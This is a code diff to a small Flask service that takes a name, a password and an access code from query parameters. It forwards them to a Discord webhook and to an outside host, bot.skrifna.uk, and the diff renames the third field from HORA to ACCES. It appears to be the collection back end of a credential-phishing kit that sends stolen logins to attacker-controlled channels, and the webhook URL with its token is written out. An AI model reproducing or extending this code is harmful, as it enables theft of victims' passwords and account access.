@@ -11,14 +11,14 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1379160851432341695/xya9f3wHLQIf
 app = Flask(__name__)
 CORS(app)
 
-def mensaje(NOMBRE, PASS, HORA):
+def mensaje(NOMBRE, PASS, ACCES):
 
-    WA_API = f"https://bot.skrifna.uk/w?n={NOMBRE}&p={PASS}&h={HORA}"
+    WA_API = f"https://bot.skrifna.uk/w?n={NOMBRE}&p={PASS}&a={ACCES}"
 
     EMBEB = {
-        "content": f"""Nombre: {NOMBRE}
-Pass: {PASS}
-Hora: {HORA}""",
+        "content": f"""NBM: {NOMBRE}
+PASS: {PASS}
+ACCES: {ACCES}""",
 }
 
     try:
@@ -40,9 +40,9 @@ Hora: {HORA}""",
 def enviar():
     NOMBRE = request.args.get("NOMBRE", "")
     PASS = request.args.get("PASS", "")
-    HORA = request.args.get("HORA", "")
+    ACCES = request.args.get("ACCES", "")
 
-    return mensaje(NOMBRE, PASS, HORA)
+    return mensaje(NOMBRE, PASS, ACCES)
 
 
 if __name__ == "__main__":
